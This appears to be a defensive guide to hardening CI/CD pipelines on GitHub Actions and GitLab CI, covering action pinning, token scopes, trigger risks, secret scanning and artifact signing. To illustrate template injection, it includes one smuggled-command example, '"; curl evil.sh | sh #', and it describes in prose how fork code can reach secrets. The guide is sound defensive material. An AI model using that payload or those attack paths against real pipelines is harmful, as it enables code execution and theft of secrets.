# CI/CD Pipeline Security

A baseline for the pipeline itself: what it is allowed to do, what it executes,
which credentials it can reach, and what it proves about the artifact it
publishes. Everything ships as a file under
[`baselines/cicd/`](../baselines/cicd/) and is validated by
[`tests/cicd.sh`](../tests/cicd.sh), which runs `actionlint` (with its
shellcheck integration) over the workflows, validates the GitLab pipeline
against GitLab's own CI schema, and checks the pre-commit config.

| | |
|---|---|
| Applies to | GitHub Actions (reusable workflows, OIDC) and GitLab CI 16+ (`id_tokens`). Tools pinned: gitleaks 8.30.1, semgrep 1.178.0, trivy 0.74.0, syft 1.52.0, cosign 3.1.3 |
| Baseline files | [`baselines/cicd/`](../baselines/cicd/), plus [`baselines/terraform/ci/plan.yml`](../baselines/terraform/ci/plan.yml) |
| Validated by | [`tests/cicd.sh`](../tests/cicd.sh) |
| Lockout risk | **Low.** Nothing here can lock you out of a host. Tightening `permissions` can break a job that was relying on a write token it should not have had — that is the finding |
| Last reviewed | 2026-09 |

## Threat model

The pipeline is the most privileged thing most organisations run, and the least
reviewed. It has write access to the artifact registry, deploy credentials for
production, and it executes code from anyone who can open a pull request.

What this baseline is for:

- **A pull request that becomes remote code execution with secrets.** The
  `pull_request_target` trap, template injection through `${{ }}`, and a
  build step that runs a fork's `npm install` lifecycle scripts.
- **A compromised third-party action.** A tag re-pointed at a malicious commit,
  which is how the `tj-actions/changed-files` compromise reached tens of
  thousands of repositories.
- **A token with more scope than the job needs.** A repository whose default
  `GITHUB_TOKEN` is read/write hands every job a write token, and one
  compromised step can push to the default branch.
- **Long-lived cloud credentials in CI variables**, usable from anywhere by
  anyone who reads a log.
- **Secrets committed and then deleted**, which are still in the pack file and
  still valid until revoked.
- **An artifact nobody can attribute.** Without a signature and an SBOM, "is
  this image ours, and what is in it" has no answer during an incident.

What it is not for:

- **Securing the runner host.** A self-hosted runner that runs untrusted pull
  requests is a host that will be compromised; use ephemeral runners, one job
  per VM. The host itself is [Linux hardening](linux-hardening.md).
- **Reviewing your own code.** SAST finds patterns, not logic errors.
- **Making dependencies safe.** Scanning tells you what is vulnerable; it does
  not fix it.
- **Replacing branch protection and code review.** A pipeline enforces what the
  repository settings allow it to.

## Three pinning rules

These are the rules [`security.yml`](../baselines/cicd/security.yml) states at
the top of the file and follows without exception.

**1. Every third-party action is pinned to a full commit SHA, with the tag in a
trailing comment on the same line.**

```yaml
- name: Checkout
  uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

The trailing position is not cosmetic. **Dependabot rewrites a comment that sits
after the SHA on the same line, and cannot touch one on the line above.** This
repository originally wrote the tag above the pin; the first Dependabot bump
changed four SHAs and left every comment claiming the old version, which is worse
than no comment — a reviewer reads `# v6.1.0` next to a v7 SHA and approves it.
`tests/cicd.sh` now asserts the format, and rejects both a bare tag and a
comment on the line above.

Tags are mutable: `@v4` and even `@v4.2.1` are pointers the upstream repository
can move, and a compromised maintainer account moves them. A SHA cannot be
repointed. The comment records which tag that SHA belonged to when it was
resolved, so a human can read the file and Dependabot can still bump it.

Resolve and verify a tag before writing it down:

```bash
gh api repos/actions/checkout/git/ref/tags/v7.0.1 --jq .object.sha
```

**2. Every tool runs from a container pinned by tag *and* digest.**

```yaml
aquasec/trivy:0.74.0@sha256:62b1e65e8869bc4b4c6aa4fa2b21595256c7c2f6018a9d9ad61caf87187c1969
```

The tag is for humans, the digest is the control. Running tools from pinned
images rather than from marketplace actions also means one fewer piece of
third-party code with access to the workspace — and the GitLab pipeline can use
the same digests, which is what stops the two from silently drifting apart.

**3. Nothing untrusted reaches a `run:` block through `${{ }}`.**

```yaml
- name: Run trivy fs scan
  env:
    FAIL_ON_SEVERITY: ${{ inputs.fail-on-severity }}
  run: |
    docker run ... --severity "$FAIL_ON_SEVERITY" --exit-code 1 .
```

`${{ }}` is substituted into the script **before** the shell sees it, so a value
like `"; curl evil.sh | sh #` is code, not data. Passing it through `env:` and
dereferencing it with `"$VAR"` makes it a string. This applies to every
attacker-influenced field: branch names, PR titles and bodies, issue comments,
commit messages, and any `inputs.*` from a caller.

`tests/cicd.sh` proves actionlint catches this class of problem by injecting an
unquoted shell variable into a `run:` block and asserting that the
shellcheck integration fires.

## Least-privilege tokens

```yaml
permissions: {}     # deny everything at the top level
```

Then grant per job, and only what that job needs:

| Job | Permissions | Why |
|---|---|---|
| secret-scan | `contents: read` | Reads the repository, writes nothing |
| sast | `contents: read`, `security-events: write` | Uploads SARIF to code scanning |
| sbom | `contents: read`, `packages: read` | syft pulls the image to inspect it |
| sign | `contents: read`, `id-token: write`, `packages: write` | Mints the OIDC token Fulcio exchanges for a certificate, and pushes the signature next to the image |

Without the top-level `permissions: {}`, a repository whose default token is
read/write hands **every** job a write token. The caller example denies by
default too: a token the reusable workflow's jobs never receive cannot be
misused by them.

Pass secrets explicitly, never `secrets: inherit`:

```yaml
secrets:
  SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}
```

`secrets: inherit` is shorter and hands the reusable workflow every secret in
the repository, including ones it has no business seeing.

On GitLab there is no `permissions:` equivalent: the job token's scope is set on
the project (**Settings → CI/CD → Token Access**), and narrowing it there is the
equivalent control.

## Triggers: `pull_request` versus `pull_request_target`

This is the single most exploited mistake in GitHub Actions, and it is worth
stating precisely.

`pull_request` is the safe trigger for untrusted contributions. The job gets a
read-only, fork-scoped `GITHUB_TOKEN`, **no** access to repository secrets, and
it checks out the merge ref.

`pull_request_target` runs the **base** branch's workflow file — so a malicious
pull request cannot edit the pipeline — but it runs with a write-capable token
and full access to secrets. A single `actions/checkout` with
`ref: ${{ github.event.pull_request.head.sha }}` then executes the fork's code
with all of it in reach. Every build step, every `npm install` lifecycle script,
every Makefile becomes a secrets-exfiltration primitive.

If you genuinely need write access on a fork pull request — labelling, posting a
review comment — put **only** that in a separate `pull_request_target` workflow
that never checks out or executes pull-request code, and keep the build and scan
jobs on `pull_request`.

Note that the OIDC `id-token` is **not** a secret, so `pull_request` withholding
secrets from forks does not withhold it. Any job that can mint one needs an
explicit guard:

```yaml
if: github.event.pull_request.head.repo.full_name == github.repository
```

That is the line in [`baselines/terraform/ci/plan.yml`](../baselines/terraform/ci/plan.yml)
that stops a fork from minting a token for your cloud account.

GitLab's analogue is protected variables: pipelines for merge requests from
forks do not get them unless you explicitly opt in. Do not opt in.

## What the pipeline actually checks

Five jobs, each with one reason to exist and each able to fail the build. No
`|| true`, no `continue-on-error`, no `exit-code: 0`.

**Secret scan (gitleaks)** with `fetch-depth: 0`:

```yaml
gitleaks git /repo --no-banner --redact --exit-code 1 \
  --report-format sarif --report-path /repo/gitleaks.sarif
```

History, not just the tip: a secret that was committed and then deleted is
still in the pack file, and still valid until it is revoked. `--redact` keeps
the finding out of the log — a scanner that prints the secret it found has
copied it into another system. `gitleaks git <path>` scans history and
`gitleaks dir <path>` scans the working tree; the old
`gitleaks detect --source=.` spelling was removed in v8 and now fails with
`unknown command`.

A found secret is not fixed by deleting the commit. **Revoke it first**, then
rewrite history if you must.

**SAST (semgrep)**: `semgrep ci --config=auto --sarif`. Both
`returntocorp/semgrep-action` and its successor `semgrep/semgrep-action` are
archived; current guidance is to run the image and invoke the CLI — `semgrep ci`
in a pipeline (it diffs against the baseline ref and honours `.semgrepignore`),
`semgrep scan` for a full scan. `--config=auto` fetches the registry's curated
rules, which needs network egress and sends anonymous usage metrics; if either
is unacceptable, vendor the rules and use
`--config=./semgrep-rules --metrics=off`.

**Dependency and IaC scan (trivy)**:

```yaml
trivy fs --scanners vuln,misconfig,secret --severity "$FAIL_ON_SEVERITY" --exit-code 1 .
```

`--exit-code 1` is what makes it a gate rather than a report. Add
`--ignore-unfixed` when the finding volume from unfixable base-image CVEs makes
people start ignoring the job — a gate everyone bypasses is worse than no gate.

**SBOM (syft)**, CycloneDX, kept 90 days. This is what you grep when the next
widely-exploited library CVE lands and someone asks "are we affected". It is
worth nothing if it is not retained longer than the incident takes to start.

**Sign and attest (cosign, keyless)**:

```bash
cosign sign --yes "$IMAGE_REF"
cosign attest --yes --type cyclonedx --predicate sbom.cdx.json "$IMAGE_REF"
```

Keyless means there is no signing key to store, rotate or leak: the workflow's
OIDC token is exchanged with Fulcio for a short-lived certificate that records
**which workflow, in which repository, at which ref** produced the artifact.

Pass a **digest**, not a tag. Signing a tag signs whatever that tag points at
right now.

### A signature nobody verifies is decoration

```bash
cosign verify \
  --certificate-identity-regexp "$IDENTITY_RE" \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  "$IMAGE_REF"
```

Both flags are required. Without `--certificate-identity*` any GitHub workflow's
signature satisfies the check; without `--certificate-oidc-issuer` any Sigstore
issuer does. A `cosign verify` with neither is a check that passes for an
attacker's signature.

One subtlety that costs an afternoon: the identity in the certificate is the
**job** workflow ref. For a reusable workflow that is the reusable file's own
`path@ref`, not the caller's. Vendored in the same repository they match; called
across repositories they do not, which is why the baseline matches on a prefix.
Print the real value once and pin the literal:

```bash
cosign verify --certificate-identity-regexp '.*' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  "$IMAGE_REF" -o text
```

The same applies on GitLab, where the issuer is `$CI_SERVER_URL` and the subject
is built from the project path and ref. Print it per environment rather than
copying a guess.

**Verification has to happen where the artifact is used**, not only in the
pipeline that produced it — that pipeline is the thing you are trying to
protect. On Kubernetes that means a verifying admission controller; see
[Kubernetes hardening](kubernetes-hardening.md) and the registry section of
[Docker security](docker-security.md).

## Pre-commit hooks are a convenience, not a control

[`.pre-commit-config.yaml`](../baselines/cicd/.pre-commit-config.yaml) runs the
same checks CI runs — gitleaks, `terraform_fmt`, `terraform_validate`,
`terraform_tflint`, `terraform_trivy`, `ansible-lint`, `detect-private-key` —
before a push, so the feedback arrives in seconds instead of minutes.

It is not the gate. **`--no-verify` is one flag away**, and a hook that runs on
a laptop runs with whatever version is cached there. The `rev:` values here are
tags rather than SHAs because pre-commit resolves and caches the hook repository
itself and `pre-commit autoupdate` maintains the field — a weaker guarantee than
the SHA pinning in `security.yml`. Treat a `rev` bump as a code review of the
hook repository, and keep the CI-side checks, which use digest-pinned images, as
the thing that actually gates merges.

## GitLab differences worth knowing

[`gitlab-ci.yml`](../baselines/cicd/gitlab-ci.yml) is the same tools at the same
digests, so the two pipelines cannot drift apart. Four differences:

- **No `permissions:`.** Job token scope is a project setting.
- **Report formats.** `artifacts:reports:sast` and `:secret_detection` want
  GitLab's own schemas, not SARIF. Tools that can emit both must be told which —
  hence `--gitlab-sast` for semgrep here and `--sarif` on GitHub.
- **`id_tokens`** with `aud: sigstore` is the OIDC equivalent that feeds Fulcio,
  exactly as GitHub's `ACTIONS_ID_TOKEN_REQUEST_*` does.
- **Protected variables** are the fork boundary, as above.
- **`entrypoint: [""]`** is needed on every tool image, or GitLab tries to run
  the image's entrypoint as the shell.

`tests/cicd.sh` validates this file against GitLab's CI JSON schema with
`gitlab-ci-local`, and asserts that the conditional jobs (`rules: if $IMAGE_REF`)
really do activate — this repository has no GitLab project, so the real CI Lint
API is not available to it, and that limitation is documented rather than
skipped.

## Rollout

1. **Add `permissions: {}` at the top of every workflow** and grant per job.
   Expect this to break a job that was relying on a write token it never
   declared; that is the finding, not a regression.
2. **Pin every action to a SHA**, resolving each tag with `gh api` rather than
   trusting the value in a blog post. Enable Dependabot for
   `github-actions` so the bumps arrive as reviewable pull requests —
   [`.github/dependabot.yml`](../.github/dependabot.yml) in this repository does
   that.
3. **Move every `${{ }}` out of `run:` blocks** into `env:`. Run `actionlint`
   locally; it finds most of them.
4. **Add the scan jobs in report-only mode** (`--exit-code 0`) for exactly one
   iteration, to see the volume. Then turn the gate on. Do not leave it off.
5. **Switch to OIDC** for cloud credentials, verify it from a throwaway branch,
   then delete the static keys.
6. **Turn on signing, then turn on verification at the point of use.** Signing
   without verification changes nothing.
7. **Audit the triggers last**: every `pull_request_target` in the repository,
   and every workflow that checks out `head.sha`.

## Verification

```bash
# Lint the workflows, including the shell inside them
actionlint
# GitLab equivalent
gitlab-ci-local --list

# Every action that is NOT pinned to a 40-character SHA
grep -rhoE 'uses: [^ ]+' .github/workflows/ \
  | grep -vE '@[0-9a-f]{40}$' | sort -u

# Every ${{ }} inside a run: block — each one is a template injection candidate
grep -rn -A20 'run: |' .github/workflows/ | grep '\${{' 

# What the default token can do, repository-wide
gh api repos/:owner/:repo/actions/permissions/workflow

# Which workflows use the dangerous trigger
grep -rln 'pull_request_target' .github/workflows/

# The signature actually verifies, and against the right identity
cosign verify --certificate-identity-regexp '^https://github\.com/<org>/' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  ghcr.io/<org>/<app>@sha256:<digest>

# The SBOM exists for the digest that is running in production
cosign download attestation ghcr.io/<org>/<app>@sha256:<digest> \
  | jq -r .payload | base64 -d | jq '.predicate.components | length'
```

## Rollback

| Change | Undo |
|---|---|
| `permissions` tightened | Add back the specific permission the job needs, named explicitly. Never go back to an undeclared default |
| Action pinned to a SHA that breaks | Pin the previous SHA, not the tag. Record the tag in the comment as always |
| Scan gate too noisy | Narrow it (`--severity`, `--ignore-unfixed`, a scoped ignore file with an expiry date), do not disable the job |
| Signing | Removing the `sign` job leaves existing signatures valid; nothing to clean up |
| Trigger changed to `pull_request` | If a job genuinely needed secrets, split it: `pull_request` for build and scan, a separate `pull_request_target` job that never checks out PR code |
| OIDC role broken | Fix the trust policy. Re-adding static keys is a last resort with an expiry date attached |
| pre-commit hook bump | Restore the previous `rev` and run `pre-commit clean` |

## Common failure modes

- **`pull_request_target` plus `actions/checkout` with `head.sha`** — the
  pipeline runs fork code with write tokens and secrets.
- **A `${{ github.event.pull_request.title }}`** (or branch name, or issue
  comment) interpolated into a `run:` block: code execution from a pull request
  title.
- **An action pinned to a tag** that gets repointed at a malicious commit.
- **`secrets: inherit`** on a reusable workflow, handing it everything.
- **No top-level `permissions:`**, so every job gets whatever the repository
  default is.
- **A `cosign verify` with no `--certificate-identity*`**, which any workflow's
  signature satisfies.
- **A tag signed instead of a digest**, so the signature covers whatever the tag
  points at later.
- **A shallow clone in the secret scan**, hiding every secret that was committed
  and then deleted.
- **A secret "fixed" by deleting the commit** but never revoked.
- **`continue-on-error: true` on a scan job**, which turns a gate into a
  decorative badge.
- **Self-hosted runners reused across jobs**, so one compromised build persists
  into the next.
- **An SBOM with 14-day retention**, gone by the time the CVE is published.
- **A scan job that only runs on the default branch**, so every finding arrives
  after the merge.

## Control mapping

Section to control families. Benchmark section numbers are deliberately not
cited: verify them against the exact benchmark version you are audited on.

| This guide | Reference | NIST SP 800-53 Rev. 5 | ISO/IEC 27001:2022 Annex A | NIS2 Art. 21(2) |
|---|---|---|---|---|
| Action and image pinning | SLSA, CIS Supply Chain, OWASP CICD-SEC-1/3 | CM-2, CM-6, SA-10, SA-12 | A.8.9, A.8.30, A.5.21 | (d) |
| Least-privilege tokens | OWASP CICD-SEC-2/6 | AC-2, AC-6 | A.5.15, A.8.2 | (i) |
| Trigger and injection hardening | OWASP CICD-SEC-4 | SI-10, CM-5 | A.8.28, A.8.32 | (e) |
| Secret scanning | OWASP CICD-SEC-6 | IA-5, SI-4 | A.5.17, A.8.12 | (b) |
| SAST, dependency and IaC scanning | — | RA-5, SA-11, SI-2 | A.8.8, A.8.29 | (e) |
| SBOM | NTIA minimum elements | SA-10, SR-4 | A.8.30, A.5.21 | (d) |
| Signing and attestation | SLSA Build L3, Sigstore | SA-10, SI-7, CM-14 | A.8.30, A.5.21 | (d) |
| Verification at point of use | — | SI-7, CM-14 | A.8.30 | (d) |
| OIDC instead of static credentials | — | IA-5, SC-12, AC-2 | A.5.15, A.5.17 | (i) |

## References

- [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
- [GitHub: security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
  — especially the script injection and `pull_request_target` sections
- [GitHub: OIDC hardening](https://docs.github.com/en/actions/concepts/security/openid-connect)
- [actionlint](https://github.com/rhysd/actionlint) (and its shellcheck
  integration)
- [Sigstore / cosign keyless signing](https://docs.sigstore.dev/cosign/signing/overview/)
  and [verification](https://docs.sigstore.dev/cosign/verifying/verify/)
- [SLSA](https://slsa.dev/) build levels
- [gitleaks](https://github.com/gitleaks/gitleaks),
  [semgrep](https://semgrep.dev/docs/), [trivy](https://trivy.dev/),
  [syft](https://github.com/anchore/syft)
- [GitLab: `id_tokens`](https://docs.gitlab.com/ci/secrets/id_token_authentication/)
  and [protected variables](https://docs.gitlab.com/ci/variables/#protect-a-cicd-variable)
- [Terraform security](terraform-security.md) for the plan-not-apply pipeline,
  and [Docker security](docker-security.md) for what gets signed
